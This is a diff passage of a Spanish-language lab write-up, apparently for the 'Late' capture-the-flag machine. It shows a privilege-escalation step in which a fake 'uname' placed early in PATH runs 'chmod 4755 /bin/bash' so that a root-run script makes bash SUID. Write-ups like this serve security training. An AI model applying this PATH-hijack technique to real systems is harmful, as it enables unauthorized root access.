@@ -110,12 +110,12 @@ drwxr-xr-x 7 root    root    4096  <span class="code-blue">share</span>
 drwxr-xr-x 2 root    root    4096  <span class="code-blue">src</span>
 </code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>El <em>script</em> en Bash anterior está ejecutando comandos sin especificar la ruta absoluta, por lo que seremos capaces de crear archivos ejecutables que sobrescriban a los legítimos. Por ejemplo, <code>uname</code>.</p><p>La ruta absoluta normal para <code>uname</code> es:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc_acc@late:~$ which uname  
 /bin/uname
-</code></pre></div><p>Pero vamos a crear un nuevo archivo ejecutable <code>uname</code> que active el privilegio SUID a <code>/bin/bash</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc_acc@late:~$ cat &gt; /usr/local/sbin/uname  
+</code></pre></div><p>Pero vamos a crear un nuevo archivo ejecutable <code>uname</code> que active el privilegio SUID a <code>/bin/bash</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc_acc@late:~$ cat &gt; /usr/local/sbin/uname
 #!/bin/bash
 
 chmod 4755 /bin/bash
 ^C
-svc_acc@late:~$ chmod +x /usr/local/sbin/uname
+svc_acc@late:~$ chmod +x /usr/local/sbin/uname  
 </code></pre></div><p>Como el <code>uname</code> malicioso está en <code>/usr/local/sbin</code> y este directorio está primero en la variable de entorno <code>PATH</code>, el comando <code>uname</code> será el nuestro:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc_acc@late:~$ which uname  
 /usr/local/sbin/uname
 </code></pre></div><p>Podemos tratar de acceder por SSH y probar con contraseñas aleatorios, pero el <em>script</em> <code>ssh-alert.sh</code> no se ejecuta, y por tanto, <code>/bin/bash</code> no es SUID aún.</p><p>Por tanto, podemos deducir que necesitamos iniciar sesión correctamente. Para ello, vemos que <code>svc_acc</code> tiene un directorio <code>.ssh</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc_acc@late:~$ ls -la
